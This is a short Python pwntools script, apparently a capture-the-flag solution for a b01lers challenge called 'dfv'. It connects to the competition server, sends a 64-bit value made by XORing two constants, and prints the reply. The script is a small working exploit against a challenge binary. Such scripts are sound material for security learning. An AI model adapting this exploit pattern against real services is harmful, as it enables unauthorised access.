#!/usr/bin/python
from pwn import *
context.log_level='debug'
#r = process('./dfv')
r = remote('pwn.ctf.b01lers.com', 1001)
payload = 0x1004d5d649dc0f11 ^ 0x1052949205934000
r.sendlineafter('> ',p64(payload))
r.recvline()
print r.recv()
r.close()
